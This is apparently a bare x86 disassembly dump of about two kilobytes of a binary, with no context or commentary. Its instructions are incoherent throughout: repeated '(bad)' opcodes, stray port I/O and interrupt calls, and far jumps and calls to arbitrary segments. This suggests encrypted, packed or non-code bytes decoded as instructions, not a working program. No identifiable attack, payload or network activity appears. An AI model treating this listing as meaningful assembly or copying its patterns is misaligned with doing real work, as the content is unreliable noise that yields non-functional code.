  4067be:	enter  0x959c,0x42
  4067c2:	je     0x4067e1
  4067c4:	mov    esp,0xb38d3647
  4067c9:	inc    esp
  4067ca:	int    0x51
  4067cc:	sub    ah,0xde
  4067cf:	mov    ch,0x47
  4067d1:	shr    ch,cl
  4067d3:	out    0x6a,eax
  4067d5:	enter  0xf690,0x28
  4067d9:	fimul  WORD PTR [eax-0x18]
  4067dc:	fst    DWORD PTR [ebp-0x7b]
  4067df:	int    0xee
  4067e1:	push   cs
  4067e2:	js     0x406798
  4067e4:	pusha  
  4067e5:	xchg   ecx,eax
  4067e6:	sub    BYTE PTR [eax-0x6ecd09ef],bl
  4067ec:	ror    DWORD PTR [eax+edx*1-0x65],cl
  4067f0:	or     ebx,DWORD PTR [esi]
  4067f2:	int    0x43
  4067f4:	xchg   ebp,eax
  4067f5:	adc    al,al
  4067f7:	arpl   WORD PTR [ebx-0x21],si
  4067fa:	jecxz  0x4067d7
  4067fc:	fmul   st(2),st
  4067fe:	inc    edx
  4067ff:	shr    BYTE PTR [edx+0x30],0xa0
  406803:	fnsave [ecx+ebx*8-0x4f]
  406807:	pop    eax
  406808:	dec    edx
  406809:	mov    esi,0x303ac638
  40680e:	pop    ds
  40680f:	jg     0x406814
  406811:	imul   ecx,DWORD PTR [esi],0xa16429c0
  406817:	pop    ss
  406818:	xor    BYTE PTR [edi],cl
  40681a:	fwait
  40681b:	pop    edi
  40681c:	mov    eax,ds:0x3828f668
  406821:	or     BYTE PTR [ebx-0x5b49c798],al
  406827:	jge    0x406835
  406829:	imul   esp,DWORD PTR [ebp+ebp*1-0x30e5b935],0xb93b762a
  406834:	jbe    0x4067b7
  406836:	test   BYTE PTR [edx-0x4],bh
  406839:	inc    esi
  40683a:	jns    0x4067e0
  40683c:	fild   QWORD PTR [edx]
  40683e:	push   cs
  40683f:	outs   dx,BYTE PTR ds:[esi]
  406840:	cmp    DWORD PTR [edx+0x1f],0x17efbea5
  406847:	neg    DWORD PTR [edi]
  406849:	arpl   bp,bx
  40684b:	jmp    0x20bf:0x693d727e
  406852:	xor    BYTE PTR [eax-0x76],bh
  406855:	std    
  406856:	mov    ecx,0x118513f5
  40685b:	stos   DWORD PTR es:[edi],eax
  40685c:	pop    esi
  40685d:	rol    BYTE PTR [edx+ebx*8-0x5d],1
  406861:	inc    edi
  406862:	adc    BYTE PTR [ebp+0x9f6e6b1],ah
  406868:	je     0x4067f4
  40686a:	jg     0x406871
  40686c:	into   
  40686d:	and    BYTE PTR [edx-0x25e280f2],bh
  406873:	fsubr  st,st(5)
  406875:	addr16 mov esp,0x7c85623f
  40687b:	sbb    ah,bh
  40687d:	cdq    
  40687e:	mov    WORD PTR [esi],es
  406880:	sub    esi,DWORD PTR [edi+ebp*1]
  406883:	cmc    
  406884:	pop    esp
  406885:	call   0x2751:0xf0623c73
  40688c:	push   0xd6bf273d
  406891:	adc    BYTE PTR [ebx-0x19],0xe2
  406895:	gs fmul st,st(2)
  406898:	fidiv  DWORD PTR [ecx+0x5d]
  40689b:	and    ebx,esp
  40689d:	not    DWORD PTR [ebx]
  40689f:	cmp    eax,0x563dd2bf
  4068a4:	or     eax,0x1025b08b
  4068a9:	and    eax,0xcad05f95
  4068ae:	pop    ecx
  4068af:	jecxz  0x4068a8
  4068b1:	mov    esp,DWORD PTR [eax]
  4068b3:	mov    BYTE PTR [edi+eiz*4],al
  4068b6:	ins    DWORD PTR es:[edi],dx
  4068b7:	sbb    ecx,DWORD PTR [edx-0x2f]
  4068ba:	and    eax,0x1f40daa1
  4068bf:	mov    ds:0x6e66d58c,eax
  4068c4:	mov    esp,0xf2a62f90
  4068c9:	sbb    eax,0xaa480b55
  4068ce:	push   ds
  4068cf:	ja     0x406918
  4068d1:	shr    DWORD PTR [edi+ecx*2-0x17],cl
  4068d5:	or     ah,BYTE PTR [esi-0x3a13e8a1]
  4068db:	je     0x40688c
  4068dd:	cmc    
  4068de:	add    eax,0x608a191b
  4068e3:	stos   DWORD PTR es:[edi],eax
  4068e4:	mov    cl,0x53
  4068e6:	arpl   WORD PTR [ecx],bx
  4068e8:	in     eax,0x24
  4068ea:	call   0xf537:0x104386b2
  4068f1:	addr16 loope 0x406875
  4068f4:	or     al,0xdd
  4068f6:	mov    WORD PTR [edx+0x49],cs
  4068f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068fa:	and    eax,0x91f3d08e
  4068ff:	sbb    ebx,ebx
  406901:	xor    BYTE PTR [eax-0x4fcccfc6],dh
  406907:	xor    al,cl
  406909:	xchg   esi,eax
  40690a:	aam    0x73
  40690c:	and    al,0xa0
  40690e:	cld    
  40690f:	and    ch,BYTE PTR [edx+ebp*1+0x73]
  406913:	jmp    DWORD PTR [edi-0x70]
  406916:	cwde   
  406917:	leave  
  406918:	dec    ecx
  406919:	in     al,dx
  40691a:	sub    al,0x3e
  40691c:	jle    0x4068b5
  40691e:	in     al,0x68
  406920:	in     eax,0x53
  406922:	and    DWORD PTR [eax+0x3a60b0ea],ebp
  406928:	ror    BYTE PTR [edx+0x79],cl
  40692b:	push   es
  40692c:	jmp    0xd55cfd29
  406931:	jb     0x406946
  406933:	repnz out dx,al
  406935:	mov    dh,0x13
  406937:	sbb    al,0xba
  406939:	or     al,0xdc
  40693b:	push   edi
  40693c:	mov    eax,DWORD PTR [ebx-0xbb86849]
  406942:	aaa    
  406943:	sbb    eax,edi
  406945:	push   edi
  406946:	ret    0xab7a
  406949:	xor    eax,0xa59d2b22
  40694e:	dec    edi
  40694f:	(bad)  
  406950:	cwde   
  406951:	or     BYTE PTR [ebx+0x0],al
  406954:	adc    eax,0x902888ca
  406959:	cmp    ch,BYTE PTR [esi-0x74c3bdcb]
  40695f:	fwait
  406960:	dec    eax
  406961:	(bad)  
  406962:	cmp    DWORD PTR [ebp+ebp*4-0x59],0x55
  406967:	and    DWORD PTR [eax+0xc],ebp
  40696a:	mov    eax,0x172e9d80
  40696f:	and    DWORD PTR [edi+0x4c],esp
  406972:	imul   ebx,ebx,0x51
  406975:	cmp    eax,0x5703253a
  40697a:	pusha  
  40697b:	and    bl,dh
  40697d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40697e:	or     al,0xed
  406980:	pop    ecx
  406981:	sbb    al,0x1b
  406983:	xchg   DWORD PTR [eax+0x1e],esi
  406986:	stos   BYTE PTR es:[edi],al
  406987:	pop    esp
  406988:	lock adc edi,DWORD PTR [esi+0x3d]
  40698c:	xchg   esp,eax
  40698d:	sub    bl,dl
  40698f:	and    BYTE PTR [edx+0x72a49bb0],dl
  406995:	imul   ecx,esp,0xb481f772
  40699b:	push   eax
  40699c:	repnz pop edi
  40699e:	test   al,0x1d
  4069a1:	out    0x9f,al
  4069a3:	mov    bh,0xb4
  4069a5:	and    BYTE PTR [esi],al
  4069a7:	and    al,0xe5
  4069a9:	push   0x4824cd82
  4069ae:	mov    bh,0xd9
  4069b0:	push   edx
  4069b1:	adc    eax,0x41ded931
  4069b6:	mov    ah,0xfd
  4069b8:	sar    BYTE PTR ds:0x6e140819,cl
  4069be:	mov    ebx,0x793e9a1a
  4069c3:	int3   
  4069c4:	push   ebx
  4069c5:	stos   DWORD PTR es:[edi],eax
  4069c6:	pop    ecx
  4069c7:	retf   0x8bf
  4069ca:	jmp    0x82b8bf8f
  4069cf:	pusha  
  4069d0:	mov    ch,0x86
  4069d2:	xlat   BYTE PTR ds:[ebx]
  4069d3:	mov    dl,0x47
  4069d5:	xor    ah,BYTE PTR [eax+0x2c7440b]
  4069db:	xchg   ebp,eax
  4069dc:	mov    WORD PTR [eax+0x56],fs
  4069df:	pop    eax
  4069e0:	xchg   ebx,eax
  4069e1:	cmp    eax,0xb99b1b29
  4069e6:	push   esp
  4069e7:	jo     0x406a49
  4069e9:	push   esi
  4069ea:	fcom   QWORD PTR [eax+0x486f1636]
  4069f0:	in     eax,0x78
  4069f2:	inc    ecx
  4069f3:	fidiv  DWORD PTR [eax-0x86a86b3]
  4069f9:	or     al,0xa5
  4069fb:	ds test dl,bh
  4069fe:	dec    esp
  4069ff:	test   BYTE PTR [esi],dl
  406a01:	in     eax,0x68
  406a03:	add    ebp,DWORD PTR [ecx-0xf48c615]
  406a09:	jmp    0x88da:0xa9c03c1c
  406a10:	and    al,0xcb
  406a12:	fisubr WORD PTR [esi+0x2b26a96a]
  406a18:	(bad)  
  406a19:	std    
  406a1a:	jnp    0x4069ae
  406a1c:	(bad)  [eax+esi*8]
  406a1f:	scas   al,BYTE PTR es:[edi]
  406a20:	inc    edi
  406a21:	jns    0x4069ac
  406a23:	sbb    eax,0x40dd620c
  406a28:	xlat   BYTE PTR ds:[ebx]
  406a29:	xchg   ebp,eax
  406a2a:	inc    ebx
  406a2b:	xor    al,0xbf
  406a2d:	inc    eax
  406a2e:	or     BYTE PTR [edx],bh
  406a30:	xchg   ebx,eax
  406a31:	sbb    bh,BYTE PTR [ebx-0x17acfbf]
  406a37:	jge    0x406a44
  406a39:	retf   0x308d
  406a3c:	pop    eax
  406a3d:	outs   dx,DWORD PTR ds:[esi]
  406a3e:	adc    BYTE PTR [ecx],ch
  406a40:	push   edi
  406a41:	rcl    DWORD PTR [esi],cl
  406a43:	clc    
  406a44:	mov    DWORD PTR [ebx-0x6a21a0f7],ecx
  406a4a:	sub    al,BYTE PTR [edx+0x18a407e6]
  406a50:	adc    BYTE PTR [ebx-0x32],bl
  406a53:	lods   eax,DWORD PTR ds:[esi]
  406a54:	cmp    al,BYTE PTR [ecx-0xd30fc91]
  406a5a:	mov    edi,0xff15e249
  406a5f:	inc    edi
  406a60:	pop    es
  406a61:	test   BYTE PTR [edx+0x469adf74],0xf7
  406a68:	(bad)  
  406a69:	rcl    DWORD PTR [edi+eiz*2-0x4a159e5e],1
  406a70:	pop    ebp
  406a71:	mov    al,0xac
  406a73:	xor    edx,DWORD PTR [edi+0x5f71df73]
  406a79:	sbb    cl,BYTE PTR [edi]
  406a7b:	sub    DWORD PTR [eax-0x4816690f],edi
  406a81:	jnp    0x406a20
  406a83:	push   eax
  406a84:	push   esp
  406a85:	scas   eax,DWORD PTR es:[edi]
  406a86:	mov    ds:0x369df603,al
  406a8b:	and    edx,DWORD PTR [edi-0x66008218]
  406a91:	adc    al,0x82
  406a93:	cld    
  406a94:	cli    
  406a95:	and    dh,BYTE PTR [ebx-0x8]
  406a98:	dec    esi
  406a99:	and    cl,ch
  406a9b:	shl    DWORD PTR [esp+ecx*4+0x6a],0xba
  406aa0:	les    ebp,FWORD PTR [ebx+0x6d]
  406aa3:	popf   
  406aa4:	sub    ch,BYTE PTR [ebp-0x27]
  406aa7:	sar    BYTE PTR [eax],cl
  406aa9:	mov    BYTE PTR [esi],bh
  406aab:	pushf  
  406aac:	ficom  DWORD PTR [ecx]
  406aae:	mov    edx,0xa4798b66
  406ab3:	(bad)  
  406ab4:	fsubr  st,st(1)
  406ab6:	aad    0xc5
  406ab8:	mov    esi,0x5b6daac9
  406abd:	cmp    cl,dh
  406abf:	pop    ss
  406ac0:	mov    bl,0xe1
  406ac2:	(bad)
  406ac6:	popf   
  406ac7:	mov    esi,0x1ff95be2
  406acc:	xchg   edx,eax
  406acd:	out    dx,eax
  406ace:	dec    esp
  406acf:	mov    ah,0xa0
  406ad1:	mov    dh,0x5e
  406ad3:	and    ch,bl
  406ad5:	and    eax,DWORD PTR ds:0x63be9ce5
  406adb:	loop   0x406a5f
  406add:	jne    0x406ae6
  406adf:	(bad)  
  406ae0:	adc    BYTE PTR [ebx],ah
  406ae2:	inc    esp
  406ae3:	xlat   BYTE PTR ds:[ebx]
  406ae4:	fld    st(3)
  406ae6:	or     dl,al
  406ae8:	lds    esp,FWORD PTR [ebp-0x1d503c07]
  406aee:	(bad)  
  406aef:	pop    di
  406af1:	dec    ebx
  406af2:	or     eax,0x2debedbe
  406af7:	xor    edx,DWORD PTR [edx-0x323ce1c8]
  406afd:	outs   dx,DWORD PTR ds:[esi]
  406afe:	test   BYTE PTR [ebx],ah
  406b00:	and    al,0x5b
  406b02:	shl    BYTE PTR [ebp+0x5e5bb3],1
  406b08:	stos   DWORD PTR es:[edi],eax
  406b09:	mov    ds:0x9c3af1a1,al
  406b0e:	mov    ds:0xfcfe50f8,al
  406b13:	popa   
  406b14:	scas   eax,DWORD PTR es:[edi]
  406b15:	mov    dh,0xdf
  406b17:	or     DWORD PTR [ecx-0x196139c6],ecx
  406b1d:	scas   eax,DWORD PTR es:[edi]
  406b1e:	fsubp  st(1),st
  406b20:	out    0x21,eax
  406b22:	stos   BYTE PTR es:[edi],al
  406b23:	cmp    eax,0x57b1f3fb
  406b28:	(bad)  
  406b29:	fadd   DWORD PTR [edx+0x6d]
  406b2c:	ja     0x406ab3
  406b2e:	adc    dh,dl
  406b30:	popf   
  406b31:	and    al,0x54
  406b34:	push   0xffffffc1
  406b36:	sbb    eax,0x780e3ced
  406b3b:	stos   BYTE PTR es:[edi],al
  406b3c:	mov    al,0x85
  406b3e:	jge    0x406b43
  406b40:	call   0x8a94:0x5f918c0e
  406b47:	and    al,0x6
  406b49:	out    0xbb,eax
  406b4b:	in     eax,0x67
  406b4d:	mov    cl,0x4b
  406b4f:	lahf   
  406b50:	jle    0x406b38
  406b52:	in     al,dx
  406b53:	xlat   BYTE PTR ds:[ebx]
  406b54:	shl    DWORD PTR [esi+0x4c],0x2a
  406b58:	and    cl,BYTE PTR [eax+0x42a682e]
  406b5e:	in     eax,0x18
  406b60:	push   esi
  406b61:	inc    ebp
  406b62:	xchg   DWORD PTR [edi+edi*2+0x28],esi
  406b66:	sub    BYTE PTR [edx+0x1183683c],ah
  406b6c:	shl    DWORD PTR [edx-0x55eb507d],0x52
  406b73:	arpl   WORD PTR ds:0x76546c71,si
  406b79:	jns    0x406b90
  406b7b:	add    eax,0x6f6ccbf
  406b80:	or     esp,edx
  406b82:	popa   
  406b83:	test   DWORD PTR [esi+eax*4-0x61a68dd0],esp
  406b8a:	bound  esp,QWORD PTR [esi-0x44]
  406b8d:	cld    
  406b8e:	mov    ebp,0xb574bf9c
  406b93:	sbb    cl,BYTE PTR ss:[ecx-0x4f1b5817]
  406b9a:	pop    es
  406b9b:	jmp    0x406bb1
  406b9d:	test   al,0xe
  406b9f:	sub    BYTE PTR [edx-0x6e],bh
  406ba2:	or     DWORD PTR [ebp-0x766bafc4],esp
  406ba8:	int3   
  406ba9:	and    DWORD PTR [ecx-0x2ce4d863],edi
  406baf:	mov    al,0x41
  406bb1:	sar    ah,1
  406bb3:	push   eax
  406bb4:	aaa    
  406bb5:	pop    edi
  406bb6:	xchg   edi,eax
  406bb7:	sub    BYTE PTR [ecx],ah
  406bb9:	sub    al,0xf9
  406bbb:	in     eax,0x86
  406bbd:	std    
  406bbe:	mov    eax,0x5bad04d6
  406bc3:	jmp    0xda138e14
  406bc8:	lock or DWORD PTR [eax],0xffffffba
  406bcc:	sgdtd  [ebx]
  406bcf:	xor    bl,BYTE PTR [ebp-0x7f]
  406bd2:	shl    DWORD PTR [ebx],0x28
  406bd5:	ja     0x406bac
  406bd7:	in     al,0x2e
  406bd9:	(bad)  
  406bda:	ds mov bh,0x14
  406bdd:	test   al,0xfc
  406bdf:	cmp    eax,0xaf986189
  406be4:	scas   eax,DWORD PTR es:[edi]
  406be5:	sbb    bh,BYTE PTR [eax+0x617e5bd0]
  406beb:	shl    DWORD PTR [ecx],cl
  406bed:	or     al,0x9f
  406bef:	sub    bh,al
  406bf1:	sbb    ch,dh
  406bf3:	jae    0x406b86
  406bf5:	mov    ch,0x8a
  406bf7:	imul   ebp,DWORD PTR [edx+0x44],0xfffffff6
  406bfb:	mov    ecx,0x894b3463
  406c00:	dec    edx
  406c01:	lods   al,BYTE PTR ds:[esi]
  406c02:	xchg   edx,eax
  406c03:	(bad)  
  406c04:	out    dx,al
  406c05:	rcr    BYTE PTR fs:[ecx+ebx*4],1
  406c09:	pop    es
  406c0a:	pop    es
  406c0b:	fld    TBYTE PTR [esi+0x3d]
  406c0e:	mov    BYTE PTR [esi],ch
  406c10:	adc    ch,BYTE PTR [edi-0x2905c8b4]
  406c16:	add    BYTE PTR [edi],cl
  406c18:	retf   0x461e
  406c1b:	les    esp,FWORD PTR [ecx]
  406c1d:	in     al,dx
  406c1e:	test   esp,eax
  406c20:	jle    0x406bdc
  406c22:	dec    esp
  406c23:	xor    ebx,0xffffffa1
  406c26:	mov    ah,0x8b
  406c28:	iret   
  406c29:	jge    0x406c3f
  406c2b:	push   ds
  406c2c:	mov    esp,DWORD PTR [eax]
  406c2e:	push   edi
  406c2f:	mov    BYTE PTR [ebp+0x15],ah
  406c32:	sbb    al,0x1d
  406c34:	test   eax,edi
  406c36:	push   0xfd2aa3d
  406c3b:	jbe    0x406bfc
  406c3d:	xchg   ebp,eax
  406c3e:	add    BYTE PTR [esi],0xea
  406c41:	adc    DWORD PTR [ecx],eax
  406c43:	inc    ebp
  406c44:	mov    ecx,ebx
  406c46:	fistp  QWORD PTR [ebp+0x18]
  406c49:	cmp    BYTE PTR [ecx-0x11086b2f],bh
  406c4f:	xchg   DWORD PTR [edx+edx*4],ebp
  406c52:	test   eax,0x1c0bb443
  406c57:	and    eax,0x59000470
  406c5c:	aad    0x93
  406c5e:	loope  0x406c7d
  406c60:	jle    0x406c02
  406c62:	adc    ebp,DWORD PTR [esi]
  406c64:	test   dh,bl
  406c66:	sbb    BYTE PTR [esi],ch
  406c68:	xor    BYTE PTR [edi+0x77cc244a],cl
  406c6e:	jp     0x406cce
  406c70:	adc    BYTE PTR [edi-0x31f626ee],ah
  406c76:	lds    ebp,FWORD PTR [ebx+0x2b]
  406c79:	fld    TBYTE PTR ds:0x241d0306
  406c7f:	inc    esi
  406c80:	mov    DWORD PTR [eax+esi*1],edx
  406c83:	repz test BYTE PTR [ebx],ah
  406c86:	mov    ds:0xc26c6d4a,al
  406c8b:	popf   
  406c8c:	pop    edx
  406c8d:	push   edx
  406c8e:	inc    esp
  406c8f:	jmp    0xbebe:0xca481df3
  406c96:	push   ebx
  406c97:	inc    esi
  406c98:	gs addr16 add al,0x16
  406c9c:	(bad)  
  406c9e:	mov    ah,cl
  406ca0:	xor    eax,0x41b0c07c
  406ca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ca6:	repz pop ebp
  406ca8:	test   al,0x69
  406caa:	(bad)  
  406cab:	imul   eax,DWORD PTR [ecx+0x221c01ce],0xce7be13c
  406cb5:	inc    edi
  406cb6:	or     eax,0xccbb722a
  406cbb:	or     al,0x35
  406cbd:	(bad)  [edi+esi*2+0x3e44b4c9]
  406cc4:	push   0x63
  406cc6:	mov    BYTE PTR [esi-0x35],cl
  406cc9:	(bad)  
  406cca:	sub    al,0x5
  406ccc:	adc    al,0x1d
  406cce:	add    al,0x9
  406cd0:	adc    dh,BYTE PTR [esi+0xeb15ad0]
  406cd6:	imul   ecx,DWORD PTR ds:0xa5e1c05c,0xbd50969
  406ce0:	adc    al,0x46
  406ce2:	fsub   st,st(4)
  406ce4:	push   esp
  406ce5:	mov    ds:0xcd4c216c,al
  406cea:	jl     0x406d00
  406cec:	cmp    eax,0x208da1b0
  406cf1:	adc    DWORD PTR [ecx+0x28],0xffffffa9
  406cf5:	push   es
  406cf6:	and    BYTE PTR [esi+0x5a86c401],cl
  406cfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cfd:	aas    
  406cfe:	xchg   ebp,eax
  406cff:	(bad)  
  406d00:	or     ebp,DWORD PTR [esi]
  406d02:	push   esi
  406d03:	pop    ebp
  406d04:	mov    al,ds:0x5d1269e8
  406d09:	mov    eax,ds:0x1f3ee659
  406d0e:	dec    ebp
  406d0f:	sbb    BYTE PTR [esp+ecx*2-0x38],0x81
  406d14:	and    esi,DWORD PTR [edx-0x66c45c64]
  406d1a:	inc    edi
  406d1b:	mov    ds,ebp
  406d1d:	jb     0x406ca3
  406d1f:	dec    esi
  406d21:	and    DWORD PTR [edi],esp
  406d23:	xor    DWORD PTR [ebx],ecx
  406d25:	xchg   esp,eax
  406d26:	es jae 0x406cf5
  406d29:	repnz das 
  406d2b:	add    al,0x5
  406d2d:	mov    ebx,0x709d69b1
  406d32:	ja     0x406d9b
  406d34:	sub    eax,0xa69346fc
  406d39:	hlt    
  406d3a:	and    BYTE PTR [esi],ah
  406d3c:	outs   dx,DWORD PTR ds:[esi]
  406d3d:	xlat   BYTE PTR ds:[ebx]
  406d3e:	mov    ds:0xeac38f34,al
  406d43:	rol    BYTE PTR [esi+ebx*2],1
  406d46:	jno    0x406d20
  406d48:	xor    eax,0xfd72b5e0
  406d4d:	sub    BYTE PTR [ecx-0x70],0x47
  406d51:	or     edi,ecx
  406d53:	or     BYTE PTR ss:[edi],ch
  406d56:	ds jl  0x406d48
  406d59:	pop    DWORD PTR [ebp+0x71f99afb]
  406d5f:	sbb    bl,dh
  406d61:	imul   DWORD PTR [ecx+0x546ea1eb]
  406d67:	js     0x406d08
  406d69:	pop    ds
  406d6a:	mov    esp,0x546f99af
  406d6f:	fnsave [esi+0x77f921cd]
  406d75:	aaa    
  406d76:	mov    al,ds:0xbf4ccc06
  406d7b:	adc    ebx,DWORD PTR [ecx+ebx*4]
  406d7e:	jne    0x406d4d
  406d80:	loopne 0x406dbd
  406d82:	pusha  
  406d83:	(bad)  
  406d84:	jecxz  0x406d3a
  406d86:	repz pop esi
  406d88:	dec    ebx
  406d89:	sahf   
  406d8a:	sub    BYTE PTR [esi+eiz*4],al
  406d8d:	lock dec esp
  406d8f:	push   ebx
  406d90:	or     ecx,DWORD PTR [ecx+0x10]
  406d93:	add    al,0xb1
  406d95:	pop    ebp
  406d96:	test   BYTE PTR [esi],dh
  406d98:	xchg   ebp,eax
  406d99:	mov    ds:0xf18a85a1,eax
  406d9e:	sbb    BYTE PTR [eax+ebp*4-0x51],dh
  406da2:	or     al,BYTE PTR [edx+0x6a027387]
  406da8:	and    dl,0xc0
  406dab:	push   edi
  406dac:	popa   
  406dad:	popf   
  406dae:	leave  
  406daf:	jmp    0x406d9d
  406db1:	sti    
  406db2:	gs in  al,dx
  406db4:	mov    edx,0x34f97b5e
  406db9:	pop    es
  406dba:	sbb    DWORD PTR [esi],edx
  406dbc:	mov    ah,0x8a
  406dbe:	test   eax,0x7215fc8d
  406dc3:	fcomp  DWORD PTR [eax]
  406dc5:	jecxz  0x406dd7
  406dc7:	jge    0x406e06
  406dc9:	(bad)  
  406dca:	push   esi
  406dcb:	(bad)  
  406dcc:	adc    al,0x2c
  406dce:	dec    ebp
  406dcf:	mov    eax,0xafcc1158
  406dd4:	xchg   esi,eax
  406dd5:	pop    ebp
  406dd6:	mov    ds:0xfb86b711,eax
  406ddb:	add    al,BYTE PTR [edx]
  406ddd:	stos   BYTE PTR es:[edi],al
  406dde:	loope  0x406e0c
  406de0:	xchg   ebp,eax
  406de1:	sbb    DWORD PTR [ebp-0x2],0x4183b65a
  406de8:	icebp  
  406de9:	jmp    0xf365:0x2c663e55
  406df0:	mov    edi,0x8222957e
  406df5:	addr16 fdivr st(5),st
  406df8:	les    ecx,FWORD PTR [ebx-0x21]
  406dfb:	adc    esi,DWORD PTR [eax+0x59]
  406dfe:	sub    al,0x2d
  406e00:	je     0x406e14
  406e02:	jmp    0x3f28895b
  406e07:	outs   dx,DWORD PTR ds:[esi]
  406e08:	popa   
  406e09:	pop    eax
  406e0a:	xor    DWORD PTR [ebx-0x5e],esp
  406e0d:	inc    ebp
  406e0e:	jg     0x406dc1
  406e10:	sbb    al,0x3a
  406e12:	arpl   WORD PTR [ecx],bx
  406e14:	ficom  WORD PTR [ebp+0x7ae1fdc0]
  406e1a:	mov    ds:0xbf38a6b5,eax
  406e1f:	adc    al,ah
  406e21:	push   esp
  406e22:	nop
  406e23:	and    al,dh
  406e25:	sahf   
  406e26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e27:	lods   eax,DWORD PTR ds:[esi]
  406e28:	pop    edi
  406e29:	mov    dh,0x89
  406e2b:	cli    
  406e2c:	imul   esp,DWORD PTR [esi+ebp*2-0x1f],0x3618187c
  406e34:	arpl   WORD PTR [esi],si
  406e36:	hlt    
  406e37:	and    eax,0x9548e5e4
  406e3c:	mov    al,0xd5
  406e3e:	addr16 das 
  406e40:	cmc    
  406e41:	dec    edi
  406e42:	xchg   ebx,eax
  406e43:	ins    BYTE PTR es:[edi],dx
  406e44:	sub    ecx,DWORD PTR [ebp-0x11a6fa0]
  406e4a:	sub    eax,0x71e612db
  406e4f:	out    0x2a,eax
  406e51:	(bad)  
  406e52:	xlat   BYTE PTR ds:[ebx]
  406e53:	scas   eax,DWORD PTR es:[edi]
  406e54:	dec    edi
  406e55:	xchg   esi,eax
  406e56:	sub    BYTE PTR [ecx-0x3b],0x2f
  406e5a:	fld    TBYTE PTR [eax-0x7bd37967]
  406e60:	sbb    al,0x19
  406e62:	cmp    cl,BYTE PTR [edi]
  406e64:	mov    ebx,0xdd49446d
  406e69:	mov    ds:0x5e9bac9b,eax
  406e6e:	shl    BYTE PTR [edx+0x4c963f64],1
  406e74:	into   
  406e75:	mov    BYTE PTR [esi+ebp*2-0x3e657c0],ch
  406e7c:	sbb    ebp,DWORD PTR [ebp-0x72]
  406e7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e80:	repnz mov fs,WORD PTR [esi+0x46]
  406e84:	jno    0x406e5c
  406e86:	(bad)  [esi-0x314dec28]
  406e8c:	or     al,0x8c
  406e8e:	pop    es
  406e8f:	push   eax
  406e90:	cmp    edi,edi
  406e92:	push   ecx
  406e93:	push   ebx
  406e94:	retf   0xa0d3
  406e97:	inc    eax
  406e98:	into   
  406e99:	xor    edi,DWORD PTR [ebp+0x5e250682]
  406e9f:	std    
  406ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ea1:	or     ah,BYTE PTR [ecx-0x235d30b8]
  406ea7:	xchg   ebx,eax
  406ea8:	pusha  
  406ea9:	cmp    eax,edx
  406eab:	pop    eax
  406eac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ead:	mov    ch,0xad
  406eaf:	adc    DWORD PTR fs:[eax+ecx*4-0x5f06de90],ebp
  406eb7:	aas    
  406eb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406eb9:	cmp    al,0xda
  406ebb:	loopne 0x406e84
  406ebd:	not    DWORD PTR [ecx]
  406ebf:	aad    0x76
  406ec1:	int3   
  406ec2:	into   
  406ec3:	xchg   ebp,eax
  406ec4:	ins    DWORD PTR es:[edi],dx
  406ec5:	push   esp
  406ec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ec7:	push   es
  406ec8:	pop    DWORD PTR [ebp-0x11]
  406ecb:	hlt    
  406ecc:	test   DWORD PTR [ebp-0x11],esp
  406ecf:	cld    
  406ed0:	mov    al,ds:0xa6dde142
  406ed5:	add    BYTE PTR ds:0x91cf953c,bl
  406edb:	enter  0x4877,0xe2
  406edf:	push   esp
  406ee0:	loope  0x406ee2
  406ee2:	pop    ecx
  406ee3:	mov    ds:0x8472640a,eax
  406ee8:	aad    0xc5
  406eea:	or     al,0xd9
  406eec:	jecxz  0x406ea5
  406eee:	pushf  
  406eef:	fild   QWORD PTR [eax+0x1c]
  406ef2:	push   eax
  406ef3:	std    
  406ef4:	and    al,0xf4
  406ef6:	xor    al,BYTE PTR [ecx+0x6c903f21]
  406efc:	sub    eax,0x2d9af43
  406f01:	fldenv [eax+0x44]
  406f04:	cmc    
  406f05:	pop    ds
  406f06:	push   ebx
  406f07:	push   ss
  406f08:	pop    eax
  406f09:	fcomi  st,st(2)
  406f0b:	(bad)  
  406f0c:	pop    ds
  406f0d:	adc    esp,0xffffffc7
  406f10:	outs   dx,BYTE PTR ds:[esi]
  406f11:	dec    edx
  406f12:	mov    ds:0xed049443,al
  406f17:	mov    edi,0x40707faf
  406f1c:	test   BYTE PTR [edx-0x1eb15bda],bl
  406f22:	in     al,dx
  406f23:	mov    cs,WORD PTR [esi-0x8]
  406f26:	inc    esi
  406f27:	sbb    DWORD PTR ds:0xd773df94,eax
  406f2d:	jb     0x406f2b
  406f2f:	clc    
  406f30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f31:	inc    esi
  406f32:	pop    edi
  406f33:	push   gs
  406f35:	pushf  
  406f36:	rcr    BYTE PTR [eax-0x62],1
  406f39:	jg     0x406f53
  406f3b:	xchg   ebx,eax
  406f3c:	add    ebp,DWORD PTR [esi-0x7d]
  406f3f:	rcl    DWORD PTR [eax+0x1d],1
  406f42:	loopne 0x406f81
  406f44:	retf   0xb140
  406f47:	scas   eax,DWORD PTR es:[edi]
  406f48:	jb     0x406ef7
  406f4a:	ror    BYTE PTR [eax+ecx*2-0x2096f92b],cl
  406f51:	retf   
  406f52:	stc    
  406f53:	leave  
  406f54:	dec    esi
  406f55:	pop    ds
  406f56:	test   BYTE PTR [ecx+eiz*8+0x19],ah
  406f5a:	sbb    eax,0x85ee5659
  406f5f:	mov    ecx,0x35aef36c
  406f64:	(bad)  
  406f65:	or     eax,0x2d7735d3
  406f6a:	mov    ch,0x16
  406f6c:	inc    ebp
  406f6d:	sub    eax,0x2b16f604
  406f72:	rol    BYTE PTR [ecx-0x5e9862d0],1
  406f78:	add    eax,DWORD PTR [edi+0x4a]
  406f7b:	mov    ds:0x9c2e7f26,al
  406f80:	in     al,0x9c
  406f82:	int3   
  406f83:	pop    esp
  406f84:	add    eax,0x9f10201e
  406f89:	or     eax,0xb07e6e78
  406f8e:	mov    al,0x2f
  406f90:	pop    ecx
  406f91:	rcl    BYTE PTR [edx],1
  406f93:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  406f95:	jmp    0x6fd4fa81
